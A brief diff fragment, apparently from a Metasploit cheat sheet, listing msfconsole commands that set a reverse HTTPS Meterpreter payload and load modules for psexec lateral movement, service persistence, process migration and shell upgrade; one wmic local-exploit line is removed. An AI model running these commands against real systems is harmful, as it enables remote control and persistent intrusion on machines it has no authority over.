@@ -555,7 +555,6 @@ msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
 msf6 > exploit
 
 msf6 > use exploit/windows/smb/psexec_psh
-msf6 > use exploit/windows/local/wmic
 msf6 > use exploit/windows/local/persistence_service
 msf6 > use post/windows/manage/migrate
 msf6 > use post/multi/manage/shell_to_meterpreter
